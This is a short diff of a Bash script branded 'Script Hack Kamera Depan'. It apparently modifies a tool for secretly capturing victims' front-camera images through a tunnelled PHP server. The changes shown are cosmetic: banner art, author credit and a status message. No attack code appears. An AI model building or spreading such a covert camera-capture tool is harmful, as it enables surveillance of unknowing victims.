@@ -10,8 +10,8 @@ banner() {
 printf "\e[1;92m | |  ____ _ _ __ ___   ___ _ __ __ _  \e[0m\e[1;77m \e[0m\n"
 printf "\e[1;92m | |/ /  _  |  _   _ \ / _ \  __/ _  | \e[0m\e[1;77m \e[0m\n"
 printf "\e[1;92m |   <| (_| | | | | | |  __/ | | (_| | \e[0m\e[1;77m \e[0m\n"
-printf "\e[1;92m |_|\_\ __ _|_| |_| |_|\___|_|  \__ _| \e[0m\e[1;77m \e[0m\n"
-printf "\e[1;92m             im hacker                 \e[0m\e[1;77m \e[0m\n"
+printf "\e[1;92m | |\_\ __ _|_| |_| |_|\___|_|  \__ _| \e[0m\e[1;77m \e[0m\n"
+printf "\e[1;92m        code by wisnusaputra123                \e[0m\e[1;77m \e[0m\n"
 printf "\e[1;92m    [  Script Hack Kamera Depan  ]   \e[0m\n"   
 printf "\e[1;77m v1.0 Follow Instagram Saya wisnu_as123 \e[0m\n"
 
@@ -91,7 +91,7 @@ server() {
 
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
 
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Memulai Serveo...\e[0m\n"
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Memulai Server...\e[0m\n"
 
 if [[ $checkphp == *'php'* ]]; then
 killall -2 php > /dev/null 2>&1
